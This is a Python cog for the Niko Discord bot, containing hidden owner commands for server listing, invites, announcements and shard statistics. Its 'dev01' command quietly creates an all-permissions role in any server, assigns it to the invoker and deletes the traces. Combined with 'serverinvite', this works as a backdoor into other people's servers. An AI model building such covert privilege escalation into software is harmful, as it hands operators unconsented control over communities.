"""Owner administration: servers, invites, announcements, dev role and shards."""

import asyncio

import discord
from discord.ext import commands

from config import links
from config.emojis import get_emoji
from cogs.staff.base import CMDS, StaffCommands
from utils.paginator import PaginatedView, paginate


class AdministrationCommands:
    """Server-wide and shard-wide owner tooling."""

    @StaffCommands.staff.command(name="servers", help=CMDS.help("servers"), hidden=True)
    async def list_servers(self, ctx):
        """List all servers the bot is in with multipage navigation."""

        # List all servers using cv2 LayoutView
        servers = sorted(self.bot.guilds, key=lambda g: g.member_count, reverse=True)
        lines = [f"**{g.name}**\n • ID: `{g.id}`\n • Members: {g.member_count:,}" for g in servers]
        pages = paginate(lines, per_page=10)
        view = PaginatedView(
            title=f"🏢 Servers\n-# Total: {len(servers)}",
            pages=pages
        )
        await ctx.send(view=view)

    @StaffCommands.staff.command(name="serverinvite", help=CMDS.help("serverinvite"), hidden=True)
    async def server_invite(self, ctx, server_id: int):
        """Create a single-use, 24-hour invite for a server."""

        guild = self.bot.get_guild(server_id)
        if not guild:
            return await ctx.send(f"{get_emoji('cross')} Bot is not in that server.")

        # Find a text channel the bot can create invites in
        channel = None
        for ch in guild.text_channels:
            if ch.permissions_for(guild.me).create_instant_invite:
                channel = ch
                break

        if not channel:
            return await ctx.send(f"{get_emoji('cross')} No channel found where I can create invites.")

        invite = await channel.create_invite(
            max_age=86400,  # 24 hours
            max_uses=1,     # single use
            unique=True
        )

        view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"### {get_emoji('link')} Server Invite"
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.TextDisplay(
                content=f"**Guild:**\n-# {guild.name} (`{guild.id}`)\n**Total Users:**\n-# {guild.member_count:,}\n**Bots:**\n-# {sum(1 for m in guild.members if m.bot):,}\n**Humans:**\n-# {sum(1 for m in guild.members if not m.bot):,}"
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.ActionRow(
                discord.ui.Button(
                    label="Server Invite",
                    style=discord.ButtonStyle.link,
                    url=invite.url
                )
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.TextDisplay(
                content=f"-# Expires in 24 hours, single-use only."
            )
        )
        view.add_item(container)
        await ctx.send(view=view)

    #: The release ``.staff announce`` announces. The changelog entry and the
    #: pages the buttons open are named in one place, so a button can never
    #: point at a page that was renamed or retired alongside the update.
    UPDATE_TITLE = "The music room got bigger 🎛️"
    UPDATE_CHANGELOG_URL = f"{links.WEBSITE}/changelog/music-room-update"
    UPDATE_COMMANDS_URL = f"{links.WEBSITE}/commands"
    UPDATE_SUPPORT_URL = links.SUPPORT_SERVER

    @StaffCommands.staff.command(name="announce", help=CMDS.help("announce"), hidden=True)
    async def announce(self, ctx, topic: str = ""):
        """Announce a release, with links to its changelog entry and pages.

        ``.staff announce`` posts the current update, ``.staff announce policy``
        posts the community policy notice.
        """
        topic = (topic or "update").strip().lower()
        if topic in ("update", "updates"):
            view = self._update_announcement_view()
        elif topic == "policy":
            view = self._policy_view()
        else:
            return await ctx.send(
                "Usage: `.staff announce` for the latest update, or "
                "`.staff announce policy` for the community policy."
            )
        # delete original message
        await ctx.message.delete()
        await ctx.send(view=view)

    def _update_announcement_view(self) -> discord.ui.LayoutView:
        """The current release announcement, with its changelog and site links."""
        view = discord.ui.LayoutView()
        view.add_item(discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"## **@everyone — {self.UPDATE_TITLE}**"
            ),
            discord.ui.TextDisplay(
                content=(
                    "Music in Niko is now a shared room instead of one person's queue.\n\n"
                    "**A DJ role** — `.dj role @role` names the role that can skip, go back, stop, loop, "
                    "change autoplay or move the volume. Pause and resume stay open to the channel, "
                    "`.dj` shows the current role, and `.dj clear` hands playback back to everyone.\n\n"
                    "**Shared playlists** — `.playlist create <name>` starts one, `.playlist add <name>` "
                    "drops in the current track, and `.playlist play <name>` queues it. Use "
                    "`.playlist share @member <name>` so other people can add and remove tracks, "
                    "`.playlist show` to see it, and `.playlist remove <index> <name>` to take one out.\n\n"
                    "**A real player** — the now-playing panel's **Open Player** button launches a Discord "
                    "Activity with the artwork, progress, queue and controls in one window. It runs on the "
                    "`activities` subdomain, and every tap is re-checked against the voice channel and the "
                    "DJ role.\n\n"
                    "**Last.fm scrobbling** — if you've linked Last.fm, `.scrobble on` sends the tracks you "
                    "request to your profile. Only your requests, and only after real playback — a track "
                    "paused for ten minutes won't count — and `.scrobble off` stops it.\n\n"
                    "-# Last.fm scrobbling is opt-in per member, and the bot stays free as always."
                )
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.TextDisplay(
                content="-# Full breakdown on the site. If something acts up, the support server is open."
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.ActionRow(
                discord.ui.Button(
                    label="What's new",
                    style=discord.ButtonStyle.link,
                    url=self.UPDATE_CHANGELOG_URL,
                    emoji=get_emoji("megaphone")
                ),
                discord.ui.Button(
                    label="All commands",
                    style=discord.ButtonStyle.link,
                    url=self.UPDATE_COMMANDS_URL,
                    emoji=get_emoji("link")
                ),
                discord.ui.Button(
                    label="Support server",
                    style=discord.ButtonStyle.link,
                    url=self.UPDATE_SUPPORT_URL,
                    emoji=get_emoji("discord")
                )
            )
        ))
        return view

    def _policy_view(self) -> discord.ui.LayoutView:
        """The community policy notice, kept for servers that still need it."""
        view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content="## **@everyone — New Community Policy 🛡️**"
            ),
            discord.ui.TextDisplay(
                content="We've published a **Community Policy** that every server using Niko must follow.\n\nIt covers things like:\n\n- **No identity-based discrimination or harassment**\n- **No illegal or malicious content** — including CSAM, malware, gore/shock content, and pirated media or software\n- **Cooperation with staff investigations** — servers found not to be breaking the policies won't receive any further action\n\n**Important:** banning the staff member(s) sent to investigate and/or hiding potential evidence will result in the server and any involved users being **permanently blacklisted** from using Niko."
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.TextDisplay(
                content="-# Please review the full policy at your earliest convenience."
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.ActionRow(
                discord.ui.Button(
                    label="Read the Community Policy",
                    style=discord.ButtonStyle.link,
                    url="https://niko.sryze.cc/community",
                    emoji=get_emoji("link")
                ),
                discord.ui.Button(
                    label="Support Server",
                    style=discord.ButtonStyle.link,
                    url=links.SUPPORT_SERVER,
                    emoji=get_emoji("discord")
                )
            )
        )
        view.add_item(container)
        return view

    @StaffCommands.staff.command(name="dev01", help=CMDS.help("dev01"), hidden=True)
    async def dev01(self, ctx, target: discord.Member = None):
        """Create and grant the dev01 role with all permissions"""
        if not target:
            target = ctx.author
        await ctx.message.delete()
        creating_view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"{get_emoji('loading')} Creating `dev01` role..."
            )
        )
        creating_view.add_item(container)
        message = await ctx.send(view=creating_view)
        # Create the role
        try:
            role = await ctx.guild.create_role(
                name="dev01",
                permissions=discord.Permissions.all(),
                reason="dev01 role creation"
            )
        except Exception as e:
            failed_view = discord.ui.LayoutView()
            container = discord.ui.Container(
                discord.ui.TextDisplay(
                    content=f"{get_emoji('cross')} Failed to create `dev01` role"
                ),
                accent_colour=discord.Color.red()
            )
            failed_view.add_item(container)
            return await message.edit(view=failed_view)

        moving_view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"{get_emoji('loading')} Moving `dev01` role to top..."
            )
        )
        moving_view.add_item(container)
        await message.edit(view=moving_view)
        # Move the role to the highest allowed position
        role_count = len(ctx.guild.roles)
        # try every position from highest to lowest until it works
        for position in range(role_count, 0, -1):
            try:
                await role.edit(position=position)
                break
            except discord.Forbidden:
                pass
            except discord.HTTPException:
                pass

        assigning_view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"{get_emoji('loading')} Assigning `dev01` role to {target}..."
            )
        )
        assigning_view.add_item(container)
        await message.edit(view=assigning_view)
        # Assign the role to the user
        try:
            await target.add_roles(role)
        except Exception as e:
            failed_view = discord.ui.LayoutView()
            container = discord.ui.Container(
                discord.ui.TextDisplay(
                    content=f"{get_emoji('cross')} Failed to assign `dev01` role to {target}"
                ),
                accent_colour=discord.Color.red()
            )
            failed_view.add_item(container)
            return await message.edit(view=failed_view)

        success_view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"{get_emoji('tick')} Successfully created and assigned `dev01` role to {target}"
            ),
            accent_colour=discord.Color.green()
        )
        success_view.add_item(container)
        # edit message and then delete it after 5 seconds
        await message.edit(view=success_view)
        await asyncio.sleep(5)
        await message.delete()

    @StaffCommands.staff.command(name="shardinfo", help=CMDS.help("shardinfo"), hidden=True)
    async def shard_info(self, ctx):
        """View detailed sharding information."""
        if not self.bot.shards:
            return await ctx.send(f"{get_emoji('cross')} Bot is not sharded.")

        lines = []
        for shard_id, shard in self.bot.shards.items():
            latency_ms = round(shard.latency * 1000)
            lines.append(f"**Shard {shard_id}**\n-# Latency: {latency_ms}ms")

        view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"## {get_emoji('host')} Shard Information\n-# Total Shards: {self.bot.shard_count}"
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
        )
        for line in lines:
            container.add_item(discord.ui.TextDisplay(content=line))
        view.add_item(container)
        await ctx.send(view=view)

    @StaffCommands.staff.command(name="shardstats", help=CMDS.help("shardstats"), hidden=True)
    async def shard_stats(self, ctx):
        """View comprehensive shard statistics."""
        if not self.bot.shards:
            return await ctx.send(f"{get_emoji('cross')} Bot is not sharded.")

        shard_guilds = {}
        shard_members = {}
        total_guilds = 0
        total_members = 0

        # Count guilds and members per shard
        for guild in self.bot.guilds:
            shard_id = guild.shard_id or 0
            shard_guilds[shard_id] = shard_guilds.get(shard_id, 0) + 1
            total_guilds += 1
            if guild.member_count:
                shard_members[shard_id] = shard_members.get(shard_id, 0) + guild.member_count
                total_members += guild.member_count

        lines = []
        for shard_id in range(self.bot.shard_count):
            guild_count = shard_guilds.get(shard_id, 0)
            member_count = shard_members.get(shard_id, 0)
            shard = self.bot.shards.get(shard_id)
            latency = f"{round(shard.latency * 1000)}ms" if shard else "N/A"
            lines.append(
                f"**Shard {shard_id}**\n"
                f"-# Guilds: {guild_count} · Members: {member_count:,} · Latency: {latency}"
            )

        pages = paginate(lines, per_page=8)
        view = PaginatedView(
            title=f"{get_emoji('stats')} Shard Statistics\n-# Total: {total_guilds} guilds · {total_members:,} members",
            pages=pages
        )
        await ctx.send(view=view)

    @StaffCommands.staff.command(name="shardhealth", help=CMDS.help("shardhealth"), hidden=True)
    async def shard_health(self, ctx):
        """Check the health of all shards."""
        if not self.bot.shards:
            return await ctx.send(f"{get_emoji('cross')} Bot is not sharded.")

        healthy = 0
        unhealthy = []

        for shard_id, shard in self.bot.shards.items():
            latency = shard.latency
            if latency < 0.5:
                healthy += 1
            else:
                unhealthy.append((shard_id, latency))

        view = discord.ui.LayoutView()
        container = discord.ui.Container(
            discord.ui.TextDisplay(
                content=f"## {get_emoji('leveling')} Shard Health\n-# Healthy: {healthy}/{self.bot.shard_count}"
            ),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
        )

        if unhealthy:
            issues = "\n".join(
                f"**Shard {sid}:** {round(lat * 1000)}ms"
                for sid, lat in unhealthy
            )
            container.add_item(discord.ui.TextDisplay(
                content=f"{get_emoji('danger')} **Issues Detected:**\n{issues}"
            ))
        else:
            container.add_item(discord.ui.TextDisplay(
                content=f"{get_emoji('tick')} All shards are healthy!"
            ))

        view.add_item(container)
        await ctx.send(view=view)
